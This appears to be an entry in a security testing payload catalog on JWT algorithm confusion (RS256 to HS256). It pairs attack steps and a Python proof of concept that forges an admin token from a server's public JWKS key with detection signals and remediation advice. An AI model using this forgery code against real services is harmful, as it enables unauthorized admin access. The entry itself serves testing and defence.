# JWT Algorithm Confusion (RS256 -> HS256)

| Field | Value |
|---|---|
| `payload_id` | PL-API-JWT-001 |
| `cwe_id` | CWE-327 |
| `owasp_controls` | CRYPTO-1, SESSION-2 |
| `severity` | critical |

## Attack

1. Obtain the server's RSA **public** key from `/.well-known/jwks.json` or the
   `x5u` / `jku` header.
2. Re-sign the token with `alg: HS256` using that public key as the HMAC secret.
3. The library trusts the `alg` header and verifies the HMAC with the public key
   material, which the attacker already has.

```python
import json, base64, hmac, hashlib, requests

def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=")

jwks = requests.get("https://TARGET/.well-known/jwks.json").json()
jwk  = next(k for k in jwks["keys"] if k.get("alg") == "RS256")
pem  = jwk_to_pem(jwk)          # public key material as PEM text
sign = hmac.new(pem.encode(), b64({"alg": "HS256", "typ": "JWT"}) + b"." +
                b64({"sub": "admin", "role": "admin"}),
                hashlib.sha256).digest()
token = (b64({"alg": "HS256", "typ": "JWT"}) + b"." +
         b64({"sub": "admin", "role": "admin"}) + b"." +
         base64.urlsafe_b64encode(sign).rstrip(b"=")).decode()
print(token)
```

## Detection

| Signal | Where |
|---|---|
| Token header `alg` != `alg` of the issuing key | API gateway / IdP audit |
| Same `kid` verified with two different algorithms | Auth service log |
| Unusual `kid` values (path, URL, traversal) | Wazuh 86691 / app log |

## Remediation

* Pin the expected algorithm server side; never take it from the token.
* Keep RS256 and HS256 keys in separate key stores.
* Validate `iss`, `aud`, `exp`, `nbf` on every request.
* OWASP JSON Web Token Cheat Sheet; control `CRYPTO-1`.
